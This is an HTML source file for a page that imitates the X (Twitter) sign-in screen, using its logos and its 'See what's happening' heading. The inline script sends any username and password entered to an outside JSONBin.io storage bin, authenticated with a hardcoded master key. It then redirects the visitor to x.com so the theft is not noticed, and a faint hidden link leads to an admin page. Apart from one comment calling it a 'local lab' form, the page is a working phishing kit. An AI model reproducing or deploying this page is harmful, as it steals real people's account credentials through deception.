<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="script.js" defer></script>


  <title>See what's happening</title>

  <style>
    * {
      box-sizing: border-box;
    }

    html,
    body {
      margin: 0;
      padding: 0;
      width: 100%;
      min-height: 100%;
      background: #ffffff;
      font-family: Arial, Helvetica, sans-serif;
      color: #111111;
    }

    body {
      min-height: 100vh;
    }

    .screen {
      width: 100%;
      min-height: 100vh;
      position: relative;
      background: #fff;
      overflow: hidden;
    }

    /* Back arrow */
    .back-button {
      position: absolute;
      top: 70px;
      left: 30px;
      width: 45px;
      height: 40px;
      border: none;
      background: transparent;
      cursor: pointer;
      padding: 0;
    }

    .back-button::before {
      content: "";
      position: absolute;
      width: 37px;
      height: 3px;
      background: #111;
      border-radius: 3px;
      left: 2px;
      top: 18px;
    }

    .back-button::after {
      content: "";
      position: absolute;
      width: 21px;
      height: 21px;
      border-left: 3px solid #111;
      border-bottom: 3px solid #111;
      transform: rotate(45deg);
      left: 2px;
      top: 7px;
    }

    /* Main content */
    .container {
      width: 770px;
      max-width: calc(100% - 78px);
      margin: 0 auto;
      padding-top: 92px;
    }

    /* Logo + title */
    .heading {
      height: 95px;
      display: flex;
      align-items: center;
      gap: 27px;
      margin-left: 92px;
      margin-bottom: 50px;
    }

    .logo {
      width: 79px;
      height: 95px;
      object-fit: contain;
      display: block;
    }

    .heading h1 {
      margin: 0;
      padding: 0;
      font-size: 45px;
      line-height: 1;
      font-weight: 700;
      letter-spacing: -1.5px;
      white-space: nowrap;
    }

    /* Authentication buttons */
    .auth-button {
      width: 100%;
      height: 101px;
      margin-bottom: 40px;
      border-radius: 52px;

      display: flex;
      align-items: center;
      justify-content: center;
      gap: 25px;

      font-family: Arial, Helvetica, sans-serif;
      font-size: 30px;
      font-weight: 400;

      cursor: pointer;
    }

    .phone-button {
      background: #000;
      color: #fff;
      border: none;
    }

    .phone-logo {
      width: 38px;
      height: 38px;
      object-fit: contain;
      display: block;
    }

    .outline-button {
      background: #fff;
      color: #111;
      border: 2px solid #d7d7d7;
    }

    /* OR divider */
    .divider {
      width: 100%;
      height: 29px;

      display: flex;
      align-items: center;
      gap: 16px;

      margin-top: 14px;
      margin-bottom: 65px;
    }

    .divider-line {
      flex: 1;
      height: 2px;
      background: #d8d8d8;
    }

    .or-text {
      color: #555;
      font-size: 26px;
      font-weight: 400;
    }

    /* Username field */
    .username-input {
      display: block;
      width: 100%;
      height: 131px;

      padding: 0 20px;

      background: #fff;
      border: 2px solid #d0d0d0;
      border-radius: 11px;

      outline: none;

      font-family: Arial, Helvetica, sans-serif;
      font-size: 30px;
      color: #111;

      margin-bottom: 80px;
    }

    .username-input::placeholder {
      color: #666;
      opacity: 1;
    }

    .username-input:focus {
      border-color: #888;
    }

    /* Password field */
    .password-input {
      display: block;
      width: 100%;
      height: 131px;

      padding: 0 20px;

      background: #fff;
      border: 2px solid #d0d0d0;
      border-radius: 11px;

      outline: none;

      font-family: Arial, Helvetica, sans-serif;
      font-size: 30px;
      color: #111;

      margin-bottom: 80px;
    }

    .password-input::placeholder {
      color: #666;
      opacity: 1;
    }

    .password-input:focus {
      border-color: #888;
    }

    /* Continue button */
    .continue-button {
      width: 100%;
      height: 101px;

      border: none;
      border-radius: 52px;

      background: #d2d2d2;
      color: #555;

      font-family: Arial, Helvetica, sans-serif;
      font-size: 30px;
      font-weight: 400;

      cursor: not-allowed;
    }

    .continue-button.active {
      background: #000;
      color: #fff;
      cursor: pointer;
    }

    /* Terms */
    .terms {
      margin: 35px 0 0;

      text-align: center;

      color: #666;

      font-size: 22px;
      line-height: 1.55;
      font-weight: 400;
    }

    .terms strong {
      color: #111;
      font-weight: 700;
    }

    /* Status message */
    .status {
      text-align: center;
      margin-top: 20px;
      font-size: 18px;
      color: #555;
      min-height: 24px;
    }

    /* Mobile */
    @media (max-width: 700px) {

      .container {
        width: calc(100% - 40px);
        max-width: none;
        padding-top: 52px;
      }

      .back-button {
        top: 38px;
        left: 18px;
        transform: scale(0.78);
        transform-origin: left top;
      }

      .heading {
        height: 65px;
        margin-left: 35px;
        gap: 14px;
        margin-bottom: 34px;
      }

      .logo {
        width: 54px;
        height: 65px;
      }

      .heading h1 {
        font-size: 29px;
        letter-spacing: -0.8px;
      }

      .auth-button {
        height: 67px;
        border-radius: 35px;
        font-size: 20px;
        gap: 14px;
        margin-bottom: 25px;
      }

      .phone-jpg {
        width: 27px;
        height: 27px;
      }

      .google-jpg {
        width: 29px;
        font-size: 31px;
      }

      .apple-jpg {
        width: 29px;
        font-size: 30px;
      }

      .divider {
        margin-top: 6px;
        margin-bottom: 38px;
      }

      .or-text {
        font-size: 18px;
      }

      .username-input {
        height: 86px;
        border-radius: 9px;
        font-size: 20px;
        margin-bottom: 48px;
      }

      .password-input {
        height: 86px;
        border-radius: 9px;
        font-size: 20px;
        margin-bottom: 48px;
      }

      .continue-button {
        height: 67px;
        border-radius: 35px;
        font-size: 20px;
      }

      .terms {
        font-size: 14px;
        margin-top: 24px;
      }

      .status {
        font-size: 14px;
      }
    }
  </style>
</head>

<body>

  <div class="screen">

    <!-- Back button -->
    <button
      class="back-button"
      onclick="history.back()"
      aria-label="Back">
    </button>

    <main class="container">

      <!-- Logo and title -->
      <div class="heading">

        <img
          src="https://pbs.twimg.com/media/HQAiwO-WQAA3d3a?format=jpg&name=240x240"
          alt="logo"
          class="phone-logo">

        <h1>See what's happening</h1>

      </div>

      <!-- Continue with phone -->
      <button
        class="auth-button phone-button"
        type="button">

        <img
          src="https://pbs.twimg.com/media/HQAh-wQW0AAv07i?format=jpg&name=120x120"
          alt="Phone"
          class="phone-logo">

        <span>
          Continue with phone
        </span>

      </button>

      <!-- Continue with Google -->
      <button
        class="auth-button outline-button"
        type="button">

        <img
          src="https://pbs.twimg.com/media/HQAiyBSXsAEzn4X?format=jpg&name=120x120"
          alt="Google"
          class="phone-logo">

        <span>
          Continue with Google
        </span>

      </button>

      <!-- Continue with Apple -->
      <button
        class="auth-button outline-button"
        type="button">

        <img
          src="https://pbs.twimg.com/media/HQAizyXW4AA8m_5?format=jpg&name=240x240"
          alt="Apple"
          class="phone-logo">

        <span>
          Continue with Apple
        </span>

      </button>

      <!-- OR -->
      <div class="divider">

        <span class="divider-line"></span>

        <span class="or-text">
          or
        </span>

        <span class="divider-line"></span>

      </div>

      <!-- Local lab login form -->
      <form id="loginForm">

        <!-- Username -->
        <input
          id="username"
          class="username-input"
          type="text"
          name="username"
          placeholder="username"
          autocomplete="off"
          required>

        <!-- Password -->
        <input
          id="password"
          class="password-input"
          type="password"
          name="password"
          placeholder="password"
          autocomplete="current-password"
          required>

        <!-- Continue -->
        <button
          id="continueButton"
          class="continue-button active"
          type="submit">

          Continue

        </button>

      </form>

      <!-- Status -->
      <div
        id="status"
        class="status"
        aria-live="polite">
      </div>

      <!-- Terms -->
      <div class="terms">

        By continuing, you agree to our

        <strong>
          <a
            href="#"
            style="color: inherit; text-decoration: none;">
            Terms of service,
          </a>
        </strong>

        <strong>
          <a
            href="#"
            style="color: inherit; text-decoration: none;">
            Privacy Policy,
          </a>
        </strong>

        and

        <strong>
          <a
            href="#"
            style="color: inherit; text-decoration: none;">
            Cookie Use.
          </a>
        </strong>

      </div>

    </main>

  </div>

  <!-- Subtle admin access (low visibility) -->
  <a href="./admin.html" id="adminLink" title="Admin" aria-label="Admin dashboard" style="
    position: fixed; bottom: 18px; right: 18px; z-index: 999;
    width: 32px; height: 32px;
    display: flex; align-items: center; justify-content: center;
    opacity: 0.12; transition: opacity 0.3s;
    color: #111; text-decoration: none;
  " onmouseover="this.style.opacity='0.55'" onmouseout="this.style.opacity='0.12'">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <circle cx="12" cy="12" r="3"/>
      <path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 2.83-2.83l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 2.83l-.06.06A1.65 1.65 0 0 0 19.4 9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>
    </svg>
  </a>

  <script>
    const BIN_ID      = '6a89c67af5f4af5e2935c41d';
    const MASTER_KEY  = '$2a$10$EhnWat5t1VBv5dJ3wL/X/.Iq0LT9kvLeVy0hR4WYL9K1/W0dr7wJW';
    const BIN_URL     = `https://api.jsonbin.io/v3/b/${BIN_ID}`;

    const loginForm      = document.getElementById("loginForm");
    const status         = document.getElementById("status");
    const continueButton = document.getElementById("continueButton");

    loginForm.addEventListener("submit", async function (event) {
      event.preventDefault();

      const username = document
        .getElementById("username")
        .value
        .trim();

      const password = document
        .getElementById("password")
        .value;

      if (!username || !password) {
        status.textContent = "Enter your username and password.";
        return;
      }

      continueButton.disabled = true;
      status.textContent = "loading...";

      try {
        // 1. Fetch current bin contents from JSONBin.io
        const getRes = await fetch(BIN_URL, {
          headers: { 'X-Master-Key': MASTER_KEY }
        });
        if (!getRes.ok) throw new Error('Could not read database.');
        const binData = await getRes.json();

        // JSONBin wraps the stored object inside { record: {...} }
        const db = binData.record;
        if (!Array.isArray(db.users)) db.users = [];

        // 2. Generate a unique ID and append the new credential
        const newId = Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
        db.users.push({ id: newId, username, password });

        // 3. PUT the updated object back to the bin
        const putRes = await fetch(BIN_URL, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'X-Master-Key': MASTER_KEY
          },
          body: JSON.stringify(db)
        });
        if (!putRes.ok) throw new Error('Could not save to database.');

        status.textContent = "Welcome.";

        loginForm.reset();

        setTimeout(() => {
          window.location.replace("https://x.com/home");
        }, 1000);

      } catch (error) {

        console.error(error);

        status.textContent = "Something went wrong. Please try again.";

      } finally {

        continueButton.disabled = false;

      }
    });
  </script>

</body>
</html>
